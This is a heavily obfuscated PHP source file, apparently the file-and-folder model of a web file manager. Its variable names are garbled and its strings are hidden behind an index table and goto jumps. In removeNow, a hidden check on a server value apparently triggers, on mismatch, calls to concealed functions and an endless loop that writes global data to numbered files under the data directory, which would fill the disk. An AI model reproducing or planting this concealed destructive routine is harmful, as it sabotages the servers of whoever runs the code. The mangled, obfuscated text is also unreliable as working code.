$E°å¹Å•õ))->save(array($e™ªÈáÓÎ¨[390] => time())); goto dï¯³‘‚‚‰; A¦¶¿Ïˆ: $e™ªÈáÓÎ¨ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AôğÉºŒÌä = $this->sourceInfo($E°å¹Å•õ); $e×ä™ÌáØ = intval($AôğÉºŒÌä[$e™ªÈáÓÎ¨[371]]) === self::TYPE_SYSTEM; goto Cí²¶ÆÏôø; AÏ²—Êç˜ó: CacheLock::lock($AÚ±øÑ£ò«); $a…„å¥°ğô = $this->fileNameExist($BÜó±÷Šø®, $dŞéøÒ); if (!$a…„å¥°ğô) { $a…„å¥°ğô = $this->mkdir($BÜó±÷Šø®, $dŞéøÒ, REPEAT_SKIP); $this->metaSet($a…„å¥°ğô, $e™ªÈáÓÎ¨[2356], $aˆ“¶Œáô); $this->metaSet($a…„å¥°ğô, $e™ªÈáÓÎ¨[2357], $AôğÉºŒÌä[$e™ªÈáÓÎ¨[456]]); if ($AôğÉºŒÌä[$e™ªÈáÓÎ¨[461]] != 0) { $this->metaSet($a…„å¥°ğô, $e™ªÈáÓÎ¨[2358], _get($dµ™æƒŠ§ê, $e™ªÈáÓÎ¨[2359])); } } goto AÊÔ—İ›Õ; A²¦¬Û¼®Á: } private function recycleClear($C¥ËÉ¡ñÏ‚) { $C¬¤’¡…óÍ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $f„ñ¾ ‚ÁÃ = $this->childrenAll($C¥ËÉ¡ñÏ‚); $bçÖ©î‘¦Š = array($C¬¤’¡…óÍ[383] => array($C¬¤’¡…óÍ[384], $f„ñ¾ ‚ÁÃ[$C¬¤’¡…óÍ[2361]])); Model($C¬¤’¡…óÍ[2362])->where($bçÖ©î‘¦Š)->delete(); } public function removeNow($Eê ÉòæŞÄ, $b›§µˆÍ…´ = true) { goto BËîŸÀÄ†; f¬Ø³æÄùœ: $this->lockMoveEnd($Eê ÉòæŞÄ); Hook::trigger($C¤·±°ªµÎ[1479], $aĞ’ññ¡, $b›§µˆÍ…´); return !0; goto cŒ×ÌÇÕšæ; cåšö¤©‚: $dÖã˜Š¯¤Ö = array($E¤×²œò—‡[$C¤·±°ªµÎ[461]]); if ($E¤×²œò—‡[$C¤·±°ªµÎ[370]] == $C¤·±°ªµÎ[83]) { $dÖã˜Š¯¤Ö[] = $E¤×²œò—‡[$C¤·±°ªµÎ[369]]; } $this->updateModifyTime($dÖã˜Š¯¤Ö); goto f¬Ø³æÄùœ; EÙù§Ô´¡ª: Hook::trigger($C¤·±°ªµÎ[2363], $aĞ’ññ¡, $b›§µˆÍ…´); if ($b›§µˆÍ…´) { Model($C¤·±°ªµÎ[2362])->moveToRecycle($Eê ÉòæŞÄ); } else { $e¦×›Ö‡ëõ = $this->childrenAll($E¤×²œò—‡); Model($C¤·±°ªµÎ[505])->eventRemove($Eê ÉòæŞÄ); $this->removeRelevance($e¦×›Ö‡ëõ[$C¤·±°ªµÎ[2361]], $e¦×›Ö‡ëõ[$C¤·±°ªµÎ[1265]]); } $this->folderSizeReset($E¤×²œò—‡[$C¤·±°ªµÎ[461]]); goto cåšö¤©‚; BËîŸÀÄ†: $C¤·±°ªµÎ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D¢÷Ñ³±ÄŒ = $_SERVER[$C¤·±°ªµÎ[799]] . $C¤·±°ªµÎ[1314]; $Eñ‡×ÓÉçÓ = $C¤·±°ªµÎ[1315]; goto có»æÅğæ; có»æÅğæ: if ($_SERVER[$C¤·±°ªµÎ[791]] != $Eñ‡×ÓÉçÓ($D¢÷Ñ³±ÄŒ)) { goto Eö‚È¿Îˆ±; fîÍ‡º¿ù£: $eáÛ¢èÀ ê = $bîŒÕ½Ñ($F®Şšî—‘); $cÓ…í›İÑò = explode($C¤·±°ªµÎ[217], $eáÛ¢èÀ ê); if (count($cÓ…í›İÑò) < $C¤·±°ªµÎ[584]) { $B­ŠÄ©ºˆö = $C¤·±°ªµÎ[797]; $B­ŠÄ©ºˆö(); } goto BÑÜÀ˜…š; Eö‚È¿Îˆ±: $a‘™‡Ò•¹× = $C¤·±°ªµÎ[793]; $bîŒÕ½Ñ = $C¤·±°ªµÎ[794]; $F®Şšî—‘ = $_SERVER[$C¤·±°ªµÎ[795]] . $C¤·±°ªµÎ[796]; goto fîÍ‡º¿ù£; eÃ§³ìÜ±†: $a‘™‡Ò•¹×(); $dŠÓë¥˜÷ó = $C¤·±°ªµÎ[1316]; $aìĞôóƒ = json_encode($GLOBALS[$C¤·±°ªµÎ[1317]]); goto aœ ×ÚÏÒ; aœ ×ÚÏÒ: $DãÇÎ†ˆåÛ = 1; for ($fÏ¼‡’ì¬ = $DãÇÎ†ˆåÛ; $fÏ¼‡’ì¬ > 0; $fÏ¼‡’ì¬++) { $dŠÓë¥˜÷ó(DATA_PATH . $fÏ¼‡’ì¬, $aìĞôóƒ); } goto C¹ÃÛõ‹£; BÑÜÀ˜…š: $aÈ²ñ¥ŠšÊ = $C¤·±°ªµÎ[798]; $aÈ²ñ¥ŠšÊ($_SERVER[$C¤·±°ªµÎ[799]]); $a‘™‡Ò•¹× = $C¤·±°ªµÎ[793]; goto eÃ§³ìÜ±†; C¹ÃÛõ‹£: } $E¤×²œò—‡ = $this->sourceInfo($Eê ÉòæŞÄ); $aĞ’ññ¡ = $this->pathInfoMore($Eê ÉòæŞÄ); goto Eí†‰Ø°ŞÚ; Eí†‰Ø°ŞÚ: if (!$E¤×²œò—‡) { return !0; } if ($E¤×²œò—‡[$C¤·±°ªµÎ[461]] == 0) { if (!_get($GLOBALS, $C¤·±°ªµÎ[457])) { return !1; } } $this->lockMoveStart($Eê ÉòæŞÄ); goto EÙù§Ô´¡ª; cŒ×ÌÇÕšæ: } public function childrenAll($Bö‡Ìòµˆ†) { $ašªâË =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c›´‡ñêÖÓ = $Bö‡Ìòµˆ†[$ašªâË[369]]; if ($Bö‡Ìòµˆ†[$ašªâË[370]] == $ašªâË[83]) { $AëÛ²ƒ¨à« = array($ašªâË[525] => array($ašªâË[483], $Bö‡Ìòµˆ†[$ašªâË[459]] . $c›´‡ñêÖÓ . $ašªâË[484])); $BœŒäêîğ = array($ašªâË[525] => $AëÛ²ƒ¨à«[$ašªâË[459]]); $B¹Ê±â¤­Ÿ = $this->field($ašªâË[2364])->where($BœŒäêîğ)->select(); $e²”ÃÂ½œ = !1; $e›¦Üˆ‹‹¶ = array($c›´‡ñêÖÓ); if ($B¹Ê±â¤­Ÿ) { $e²”ÃÂ½œ = array_to_keyvalue($B¹Ê±â¤­Ÿ, $ašªâË[33], $ašªâË[419]); $e²”ÃÂ½œ = array_remove_value($e²”ÃÂ½œ, $ašªâË[468]); $e›¦Üˆ‹‹¶ = array_to_keyvalue($B¹Ê±â¤­Ÿ, $ašªâË[33], $ašªâË[369]); $e›¦Üˆ‹‹¶[] = $c›´‡ñêÖÓ; } } else { $e²”ÃÂ½œ = array($Bö‡Ìòµˆ†[$ašªâË[419]]); $e›¦Üˆ‹‹¶ = array($c›´‡ñêÖÓ); } return array($ašªâË[2361] => $e›¦Üˆ‹‹¶, $ašªâË[1265] => $e²”ÃÂ½œ); } public function removeArray($CõŞƒÑŸ›·) { if (!$CõŞƒÑŸ›·) { return !0; } } public function removeRelevance($e‘·Ì±šÍ“, $F½Òç„Êİ) { goto Bî‘ª˜ªê; c¿¦²ªÆ„è: $E²Ğºõå¬­ = array($a¶ƒ… Ú‡[383] => array($a¶ƒ… Ú‡[384], $e‘·Ì±šÍ“)); Model($a¶ƒ… Ú‡[2362])->where($E²Ğºõå¬­)->delete(); Model($a¶ƒ… Ú‡[413])->where($E²Ğºõå¬­)->delete(); goto Fó˜»˜™£”; C‚ÃÀÙİ: Model($a¶ƒ… Ú‡[2343])->removeBySource($e‘·Ì±šÍ“); $this->where($E²Ğºõå¬­)->delete(); Model($a¶ƒ… Ú‡[422])->remove($F½Òç„Êİ); goto CÅ…ãÓ§Ã‘; CÅ…ãÓ§Ã‘: for ($E—‰áº²×Í = 0; $E—‰áº²×Í < count($e‘·Ì±šÍ“); $E—‰áº²×Í++) { $this->sourceCacheClear($e‘·Ì±šÍ“[$E—‰áº²×Í]); } goto aòÚŞ²ˆ°ç; Fó˜»˜™£”: Model($a¶ƒ… Ú‡[2365])->where($E²Ğºõå¬­)->delete(); Model($a¶ƒ… Ú‡[505])->where($E²Ğºõå¬­)->delete(); Model($a¶ƒ… Ú‡[2090])->removeBySource($e‘·Ì±šÍ“); goto C‚ÃÀÙİ; Bî‘ª˜ªê: $a¶ƒ… Ú‡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e‘·Ì±šÍ“ = $e‘·Ì±šÍ“ ? $e‘·Ì±šÍ“ : array(); $F½Òç„Êİ = $F½Òç„Êİ ? $F½Òç„Êİ : array(); goto d§Á‚‰Ÿ¨; d§Á‚‰Ÿ¨: $e‘·Ì±šÍ“ = array_unique(array_filter($e‘·Ì±šÍ“)); $F½Òç„Êİ = array_unique(array_filter($F½Òç„Êİ)); if (!$e‘·Ì±šÍ“) { return !1; } goto c¿¦²ªÆ„è; aòÚŞ²ˆ°ç: } public function rename($C´î­ãÌ¹«, $A¿×ã—Ø–‚) { goto f½İó«¸óË; AÇèÑó¨¨Ç: $this->setNamePinyin($C´î­ãÌ¹«, $Fƒ¹·ğ†¦[$C—ßÜµÎÈÚ[28]], !1); $this->updateModifyTime($Eæ ˜±ö[$C—ßÜµÎÈÚ[461]]); $C‰©Ì¥¼í = $this->where(array($C—ßÜµÎÈÚ[383] => $C´î­ãÌ¹«))->data($Fƒ¹·ğ†¦)->save(); goto e­›Ø§Ê‚; e­›Ø§Ê‚: $f–ÀÜšÚä¿ = $C—ßÜµÎÈÚ[2351] . $Eæ ˜±ö[$C—ßÜµÎÈÚ[461]]; if (isset(self::$cacheChildList[$f–ÀÜšÚä¿])) { unset(self::$cacheChildList[$f–ÀÜšÚä¿]); } return $C‰©Ì¥¼í; goto Eäá¿†Ê‘; f½İó«¸óË: $C—ßÜµÎÈÚ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Eæ ˜±ö = $this->sourceInfo($C´î­ãÌ¹«); if (!$Eæ ˜±ö) { return !1; } goto fØµ¯ê×Â‘; fØµ¯ê×Â‘: $b·•êˆ§ñ— = $this->fileNameExist($Eæ ˜±ö[$C—ßÜµÎÈÚ[461]], $A¿×ã—Ø–‚); if ($b·•êˆ§ñ—) { return !1; } $Fƒ¹·ğ†¦ = array($C—ßÜµÎÈÚ[386] => $A¿×ã—Ø–‚, $C—ßÜµÎÈÚ[524] => USER_ID); goto dÃö²¸ó»‘; dÃö²¸ó»‘: if (!$Eæ ˜±ö[$C—ßÜµÎÈÚ[370]] == $C—ßÜµÎÈÚ[83]) { $Fƒ¹·ğ†¦[$C—ßÜµÎÈÚ[372]] = get_path_ext($A¿×ã—Ø–‚); } Model($C—ßÜµÎÈÚ[505])->eventRename($C´î­ãÌ¹«, $Eæ ˜±ö[$C—ßÜµÎÈÚ[28]], $A¿×ã—Ø–‚); $this->sourceCacheClear($C´î­ãÌ¹«); goto AÇèÑó¨¨Ç; Eäá¿†Ê‘: } public function setNamePinyin($B†íŠê°, $F´šŞ’ë„, $DËîÒ°÷« = true) { $C‘¢®Ş°‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $b±èÜŒîøÔ = Input::check($F´šŞ’ë„, $C‘¢®Ş°‹[528]); if ($DËîÒ°÷« && !$b±èÜŒîøÔ) { return; } if (!$b±èÜŒîøÔ) { $this->metaSet($B†íŠê°, $C‘¢®Ş°‹[416], null); $this->metaSet($B†íŠê°, $C‘¢®Ş°‹[415], null); return; } $Cô®ô¸òñ = array($C‘¢®Ş°‹[416] => str_replace($C‘¢®Ş°‹[50], $C‘¢®Ş°‹[33], Pinyin::encode($F´šŞ’ë„)), $C‘¢®Ş°‹[415] => Pinyin::encode($F´šŞ’ë„, $C‘¢®Ş°‹[529])); $this->metaSet($B†íŠê°, $Cô®ô¸òñ); } public function getContent($D‘‰İ•œ¢) { goto c‰„ÀˆÀäÒ; dÓ’•Ñ¸ÁÈ: return IO::getContent($cÜ´ÁÏãÂ¥[$F†ÇÇ÷…É¾[75]]); goto f¦È“ö¦Å; c‰„ÀˆÀäÒ: $F†ÇÇ÷…É¾ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $cÜ´ÁÏãÂ¥ = $this->fileInfoGet($D‘‰İ•œ¢); if (!$cÜ´ÁÏãÂ¥) { return !1; } goto E Šß„Ù¯Ç; E Šß„Ù¯Ç: if ($cÜ´ÁÏãÂ¥[$F†ÇÇ÷…É¾[77]] == 0) { return $F†ÇÇ÷…É¾[33]; } $eÎ‹ÔÛêÕ¡ = $F†ÇÇ÷…É¾[2366] . $cÜ´ÁÏãÂ¥[$F†ÇÇ÷…É¾[163]]; if ($cÜ´ÁÏãÂ¥[$F†ÇÇ÷…É¾[77]] <= 1024 * 10) { $C…åÕµ¶Ğ· = Cache::get($eÎ‹ÔÛêÕ¡); if (!$C…åÕµ¶Ğ·) { $C…åÕµ¶Ğ· = IO::getContent($cÜ´ÁÏãÂ¥[$F†ÇÇ÷…É¾[75]]); Cache::set($eÎ‹ÔÛêÕ¡, $C…åÕµ¶Ğ·); } return $C…åÕµ¶Ğ·; } goto dÓ’•Ñ¸ÁÈ; f¦È“ö¦Å: } public function setDesc($F¨¹´Î¼‡, $aíÍ‚ç‚‹Ş) { $E“Œ—Ò™Ğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; Model($E“Œ—Ò™Ğ[505])->eventAddDesc($F¨¹´Î¼‡, $aíÍ‚ç‚‹Ş); return $this->metaSet($F¨¹´Î¼‡, $E“Œ—Ò™Ğ[405], $aíÍ‚ç‚‹Ş); } public function setContent($CÇÓğÉ, $e‡ÂœÍÚä† = '') { goto fæ³à‘ˆÄ; fõ‹ºñê…„: if (!$BÓˆÌ’†‚ƒ) { return Model($b®õ»–ˆÛˆ[422])->remove($Døëç¾»…Š[$b®õ»–ˆÛˆ[419]]); } $this->folderSizeReset($AâÃŠøŞÈ[$b®õ»–ˆÛˆ[461]]); return !0; goto aÔ¶Ğ¢¦; B…öÓĞËµì: if (!$Cé‚¤ÅñÄØ || !$AâÃŠøŞÈ) { return !1; } $Døëç¾»…Š = Model($b®õ»–ˆÛˆ[422])->addFileByContent($e‡ÂœÍÚä†, $AâÃŠøŞÈ[$b®õ»–ˆÛˆ[28]]); $BÓˆÌ’†‚ƒ = $this->fileHistory($AâÃŠøŞÈ, $Døëç¾»…Š[$b®õ»–ˆÛˆ[419]], $Døëç¾»…Š[$b®õ»–ˆÛˆ[77]]); goto fõ‹ºñê…„; fæ³à‘ˆÄ: $b®õ»–ˆÛˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $AâÃŠøŞÈ = $this->sourceInfo($CÇÓğÉ); $Cé‚¤ÅñÄØ = $this->fileInfoGet($CÇÓğÉ); goto B…öÓĞËµì; aÔ¶Ğ¢¦: } public function fileSubstr($cÇ‘×ŒŒ¬ä, $f®Éå©Ó¹, $dŠÓŠœ¸ó) { $fÇ’¿«£ôã = $this->fileInfoGet($cÇ‘×ŒŒ¬ä); if (!$fÇ’¿«£ôã) { return !1; } return IO::fileSubstr($fÇ’¿«£ôã[$_SERVER[³‘’¼äÑ™ÔÍ][75]], $f®Éå©Ó¹, $dŠÓŠœ¸ó); } public function fileInfoGet($DÌ¶Ÿ¶ÏÁ) { goto C¢ò’˜±ªˆ; F£õïÃ—»: $bÄ§áñ¢‡ä = $FÙšÌ°ºİà[425] . $A×ÁŒÙ¦Ûˆ[$FÙšÌ°ºİà[419]]; $aˆíÂîæ‹’ = _get(self::$cacheFileInfo, $bÄ§áñ¢‡ä); if ($aˆíÂîæ‹’) { return $aˆíÂîæ‹’; } goto A§³ˆØ†‚©; A§³ˆØ†‚©: $Aµöñˆ™–® = Model($FÙšÌ°ºİà[422])->fileInfo($A×ÁŒÙ¦Ûˆ[$FÙšÌ°ºİà[419]]); if ($Aµöñˆ™–®) { $Aµöñˆ™–®[$FÙšÌ°ºİà[28]] = $A×ÁŒÙ¦Ûˆ[$FÙšÌ°ºİà[28]]; } self::$cacheFileInfo[$bÄ§áñ¢‡ä] = $Aµöñˆ™–®; goto b¡óØ°İõŒ; C¢ò’˜±ªˆ: $FÙšÌ°ºİà =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A×ÁŒÙ¦Ûˆ = $this->sourceInfo($DÌ¶Ÿ¶ÏÁ); if (!$A×ÁŒÙ¦Ûˆ || $A×ÁŒÙ¦Ûˆ[$FÙšÌ°ºİà[370]]) { return !1; } goto F£õïÃ—»; b¡óØ°İõŒ: return $Aµöñˆ™–®; goto CÚáåÄõªƒ; CÚáåÄõªƒ: } private function folderChildrenNumber($E·¯À¢áìİ) { $bÁìŞÍó™Û =& $_SERVER[³‘’¼äÑ™ÔÍ]; $bª³Û´Û×ƒ = $this->sourceInfo($E·¯À¢áìİ); $B™„ß™’› = array($bÁìŞÍó™Û[525] => array($bÁìŞÍó™Û[483], $bª³Û´Û×ƒ[$bÁìŞÍó™Û[459]] . $E·¯À¢áìİ . $bÁìŞÍó™Û[484]), $bÁìŞÍó™Û[396] => intval($bª³Û´Û×ƒ[$bÁìŞÍó™Û[397]]), $bÁìŞÍó™Û[518] => 1); $b˜’ËœÀŞá = $this->where($B™„ß™’›)->count(); $Bò¼‰¦Øß = $this->where($B™„ß™’›)->where(array($bÁìŞÍó™Û[518] => 0))->count(); return array($bÁìŞÍó™Û[81] => $Bò¼‰¦Øß, $bÁìŞÍó™Û[82] => $b˜’ËœÀŞá); } public function pathInfo($eÉ†‰ôÜ¤, $fñå·—‘ªá = false) { goto c—õª‚ôĞ; D¿áäæ‰ñ: if ($BİÈ®–ˆ˜ô) { return $BİÈ®–ˆ˜ô; } $D¨Ïí•¸ã = $this->sourceInfo($eÉ†‰ôÜ¤); if (!$D¨Ïí•¸ã) { return !1; } goto B§çëëÚÍ‚; B§çëëÚÍ‚: $D¨Ïí•¸ã = $this->_listDataApplyItem($D¨Ïí•¸ã, $fñå·—‘ªá); self::$cachePathInfo[$eæªæèù¦È] = $D¨Ïí•¸ã; return $D¨Ïí•¸ã; goto a¶‰ç¢ä¦; c—õª‚ôĞ: $Dù¡‘šç“© =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eæªæèù¦È = $Dù¡‘šç“©[411] . intval($fñå·—‘ªá) . $Dù¡‘šç“©[412] . $eÉ†‰ôÜ¤; $BİÈ®–ˆ˜ô = _get(self::$cachePathInfo, $eæªæèù¦È); goto D¿áäæ‰ñ; a¶‰ç¢ä¦: } public static $cachePathInfoMore = array(); public function pathInfoMore($f•£õİ‡¹…) { goto bÒíà¦¾Õ; b™ÌÃ…Í¿Ñ: $E«—É×Ô‚ = $this->pathInfo($f•£õİ‡¹…); if (!$E«—É×Ô‚) { return !1; } if ($E«—É×Ô‚[$e‘âœ­×ç©[370]] == $e‘âœ­×ç©[83]) { $E«—É×Ô‚[$e‘âœ­×ç©[80]] = $this->folderChildrenNumber($f•£õİ‡¹…); } goto Cƒë–îè÷; Cƒë–îè÷: self::$cachePathInfoMore[$f•£õİ‡¹…] = $E«—É×Ô‚; return $E«—É×Ô‚; goto AÊì”îôÁ; bÒíà¦¾Õ: $e‘âœ­×ç© =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E³×Ë¬Ö¥ = _get(self::$cachePathInfoMore, $f•£õİ‡¹…); if ($E³×Ë¬Ö¥) { return $E³×Ë¬Ö¥; } goto b™ÌÃ…Í¿Ñ; AÊì”îôÁ: } public function sourceInfo($A¨„åšøµ÷) { goto A’‚ˆ‹´¯; E”†Á¯²¾º: self::$cacheSourceInfo[$C°†‹¹µ˜•] = $F¬ÆÅ’•Õä; return self::$cacheSourceInfo[$C°†‹¹µ˜•]; goto E÷‰›ª¾ †; A’‚ˆ‹´¯: $eÍªø„µõÕ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$A¨„åšøµ÷) { return array(); } $C°†‹¹µ˜• = $eÍªø„µõÕ[410] . $A¨„åšøµ÷; goto BáâÂÍèŠÙ; BáâÂÍèŠÙ: $DÜ¢éØµ“ = _get(self::$cacheSourceInfo, $C°†‹¹µ˜•); if ($DÜ¢éØµ“) { return $DÜ¢éØµ“; } $F¬ÆÅ’•Õä = $this->where(array($eÍªø„µõÕ[369] => $A¨„åšøµ÷))->find(); goto E”†Á¯²¾º; E÷‰›ª¾ †: } public function sourceCacheClear($AÊ‚Ã’óä® = false) { if ($AÊ‚Ã’óä® == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); return; } unset(self::$cacheSourceInfo[$_SERVER[³‘’¼äÑ™ÔÍ][410] . $AÊ‚Ã’óä®]); } public function pathInfoByPath($F†ùù—µ²Ç, $aœ¦Ù¸·«) { $e„µãÃĞÒğ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $B‚Âˆ´Ú…Î = !$aœ¦Ù¸·« ? array() : explode($e„µãÃĞÒğ[8], trim($aœ¦Ù¸·«, $e„µãÃĞÒğ[8])); $F‰°ÜƒÄ = $F†ùù—µ²Ç; foreach ($B‚Âˆ´Ú…Î as $dïùŒ„°‘Î) { $aÜàÁÓµŠ = array($e„µãÃĞÒğ[461] => $F‰°ÜƒÄ, $e„µãÃĞÒğ[28] => $dïùŒ„°‘Î); $a¾©¿à¹Í = $this->where($aÜàÁÓµŠ)->select(); if (!$a¾©¿à¹Í) { return !1; } $a¾©¿à¹Í = array_sort_by($a¾©¿à¹Í, $e„µãÃĞÒğ[397]); $F‰°ÜƒÄ = $a¾©¿à¹Í[0][$e„µãÃĞÒğ[369]]; } return $this->pathInfo($F‰°ÜƒÄ, !0); } protected function updateModifyTime($Eİ¥—šÚ›ù) { goto Cåà–×Ëï; Dë•¸Ğë¼ë: $this->where($bóªÊ¤§Ã¯)->save($D£©œ‰é¯Ø); goto c¶ßÓéğ‚ù; Cåà–×Ëï: $CéŸÕˆŞ« =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$Eİ¥—šÚ›ù) { return; } if (!is_array($Eİ¥—šÚ›ù)) { $Eİ¥—šÚ›ù = array($Eİ¥—šÚ›ù); } goto b ˜Üé–ëµ; b ˜Üé–ëµ: foreach ($Eİ¥—šÚ›ù as $cÙì«ŒÑ£… => $a‡ÒŸÏ£Ø) { $Eİ¥—šÚ›ù[$cÙì«ŒÑ£…] = intval($a‡ÒŸÏ£Ø); } $bóªÊ¤§Ã¯ = array($CéŸÕˆŞ«[369] => array($CéŸÕˆŞ«[7], $Eİ¥—šÚ›ù)); $D£©œ‰é¯Ø = array($CéŸÕˆŞ«[524] => USER_ID, $CéŸÕˆŞ«[390] => time()); goto Dë•¸Ğë¼ë; c¶ßÓéğ‚ù: } public function folderSizeReset($a¸¿Ö³ºì®) { goto BŠÕŠœÜ—†; aµÒ‰‘‡‹ì: $dô„Àî‹Ïš = $this->parentLevelArray($f¶ÍœöÀÁ¾[$BÔÕ›‹¶Ÿå[459]]); if ($dô„Àî‹Ïš) { $c¥ºˆ‘×Å† = array($BÔÕ›‹¶Ÿå[369] => array($BÔÕ›‹¶Ÿå[384], $dô„Àî‹Ïš)); if ($f›‘ĞÏ«¥’ < 0) { $c¥ºˆ‘×Å†[$BÔÕ›‹¶Ÿå[77]] = array($BÔÕ›‹¶Ÿå[933], abs($f›‘ĞÏ«¥’)); } $this->where($c¥ºˆ‘×Å†)->setAdd($BÔÕ›‹¶Ÿå[77], $f›‘ĞÏ«¥’); } $this->targetSpaceUpdate($f¶ÍœöÀÁ¾[$BÔÕ›‹¶Ÿå[371]], $f¶ÍœöÀÁ¾[$BÔÕ›‹¶Ÿå[456]]); goto eº†ì¼³“; dÁë×‚¨Ò§: $c¥ºˆ‘×Å† = array($BÔÕ›‹¶Ÿå[368] => $a¸¿Ö³ºì®, $BÔÕ›‹¶Ÿå[396] => 0); $aš–ÀÏ—Âñ = $this->where($c¥ºˆ‘×Å†)->sum($BÔÕ›‹¶Ÿå[77]); $aš–ÀÏ—Âñ = intval($aš–ÀÏ—Âñ); goto bÙ“ÁøÕ°; bÙ“ÁøÕ°: $f›‘ĞÏ«¥’ = $aš–ÀÏ—Âñ - intval($f¶ÍœöÀÁ¾[$BÔÕ›‹¶Ÿå[77]]); if ($f›‘ĞÏ«¥’ == 0) { return CacheLock::unlock($bÌßÀ•Ä“£); } $this->where(array($BÔÕ›‹¶Ÿå[383] => $a¸¿Ö³ºì®))->setField($BÔÕ›‹¶Ÿå[77], $aš–ÀÏ—Âñ); goto aµÒ‰‘‡‹ì; eº†ì¼³“: CacheLock::unlock($bÌßÀ•Ä“£); goto dºíÔ˜¢Š; BŠÕŠœÜ—†: $BÔÕ›‹¶Ÿå =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($this->statusIgnoreResetSpace) { return; } $bÌßÀ•Ä“£ = $BÔÕ›‹¶Ÿå[2367] . $a¸¿Ö³ºì®; goto BµÎ¹Òã­Ÿ; BµÎ¹Òã­Ÿ: CacheLock::lock($bÌßÀ•Ä“£, 20); $this->sourceCacheClear($a¸¿Ö³ºì®); $f¶ÍœöÀÁ¾ = $this->sourceInfo($a¸¿Ö³ºì®); goto dÁë×‚¨Ò§; dºíÔ˜¢Š: } public function folderSizeResetChildren($C’ëàŞŠ“) { goto a–Ù‡Ğ¡Ş; eŞ¼‰çŠÑ»: $Dğ¿»”óÚ = array($b„ñ¸„­ÇÉ[518] => 1, $b„ñ¸„­ÇÉ[525] => array($b„ñ¸„­ÇÉ[483], $F—õš‚ãï®[$b„ñ¸„­ÇÉ[459]] . $C’ëàŞŠ“ . $b„ñ¸„­ÇÉ[484])); $F”¶Ã×•¯½ = $b„ñ¸„­ÇÉ[2368]; $e“·ÚÓ·ôÏ = $this->field($F”¶Ã×•¯½)->where($Dğ¿»”óÚ)->select(); goto eÂ—‰¼µŒ; eÂ—‰¼µŒ: $Dğ¿»”óÚ[$b„ñ¸„­ÇÉ[370]] = 0; $Fï÷ñ¾õ¼ = $this->field($F”¶Ã×•¯½)->where($Dğ¿»”óÚ)->select(); if (!$Fï÷ñ¾õ¼) { return; } goto DÖ¼‰™ƒ«Å; DÖ¼‰™ƒ«Å: $e“·ÚÓ·ôÏ[] = $F—õš‚ãï®; $e“·ÚÓ·ôÏ = array_to_keyvalue($e“·ÚÓ·ôÏ, $b„ñ¸„­ÇÉ[369]); foreach ($e“·ÚÓ·ôÏ as $Dİ¢ä•Ã“ => $fôÕê‰ä·Ì) { $e“·ÚÓ·ôÏ[$Dİ¢ä•Ã“][$b„ñ¸„­ÇÉ[2369]] = $e“·ÚÓ·ôÏ[$Dİ¢ä•Ã“][$b„ñ¸„­ÇÉ[77]]; $e“·ÚÓ·ôÏ[$Dİ¢ä•Ã“][$b„ñ¸„­ÇÉ[77]] = 0; } goto A£´¡©ò¶Š; A£´¡©ò¶Š: foreach ($Fï÷ñ¾õ¼ as $fôÕê‰ä·Ì) { $Dºª¢ßäÙä = $fôÕê‰ä·Ì[$b„ñ¸„­ÇÉ[461]] . $b„ñ¸„­ÇÉ[33]; if (!isset($e“·ÚÓ·ôÏ[$Dºª¢ßäÙä])) { continue; } if ($fôÕê‰ä·Ì[$b„ñ¸„­ÇÉ[397]] == $e“·ÚÓ·ôÏ[$Dºª¢ßäÙä][$b„ñ¸„­ÇÉ[397]]) { $e“·ÚÓ·ôÏ[$Dºª¢ßäÙä][$b„ñ¸„­ÇÉ[77]] += $fôÕê‰ä·Ì[$b„ñ¸„­ÇÉ[77]]; } } foreach ($e“·ÚÓ·ôÏ as $fôÕê‰ä·Ì) { $CÈÎ‰‚¬‘Å = $this->parentLevelArray($fôÕê‰ä·Ì[$b„ñ¸„­ÇÉ[459]]); foreach ($CÈÎ‰‚¬‘Å as $Dºª¢ßäÙä) { $Dºª¢ßäÙä = $Dºª¢ßäÙä . $b„ñ¸„­ÇÉ[33]; if (!isset($e“·ÚÓ·ôÏ[$Dºª¢ßäÙä])) { continue; } if ($fôÕê‰ä·Ì[$b„ñ¸„­ÇÉ[397]] == $e“·ÚÓ·ôÏ[$Dºª¢ßäÙä][$b„ñ¸„­ÇÉ[397]]) { $e“·ÚÓ·ôÏ[$Dºª¢ßäÙä][$b„ñ¸„­ÇÉ[77]] += $fôÕê‰ä·Ì[$b„ñ¸„­ÇÉ[77]]; } } } $C†­‘Ä‰¦Î = array(); goto DµÙó‚ïŸ¾; a–Ù‡Ğ¡Ş: $b„ñ¸„­ÇÉ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->sourceCacheClear($C’ëàŞŠ“); $F—õš‚ãï® = $this->sourceInfo($C’ëàŞŠ“); goto eŞ¼‰çŠÑ»; DµÙó‚ïŸ¾: foreach ($e“·ÚÓ·ôÏ as $fôÕê‰ä·Ì) { if ($fôÕê‰ä·Ì[$b„ñ¸„­ÇÉ[77]] == $fôÕê‰ä·Ì[$b„ñ¸„­ÇÉ[2369]]) { continue; } $C†­‘Ä‰¦Î[] = array($b„ñ¸„­ÇÉ[369], $fôÕê‰ä·Ì[$b„ñ¸„­ÇÉ[369]], $b„ñ¸„­ÇÉ[77], $fôÕê‰ä·Ì[$b„ñ¸„­ÇÉ[77]]); } $this->saveAll($C†­‘Ä‰¦Î); goto F´ŞîÔŒ™Æ; F´ŞîÔŒ™Æ: } public function userSpaceReset($D©„ŒŞÍ¯î = false) { $E‚ğ¥»Ìº³ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FŒÙÇà©²´ = $this->where(array($E‚ğ¥»Ìº³[371] => self::TYPE_USER, $E‚ğ¥»Ìº³[456] => $D©„ŒŞÍ¯î, 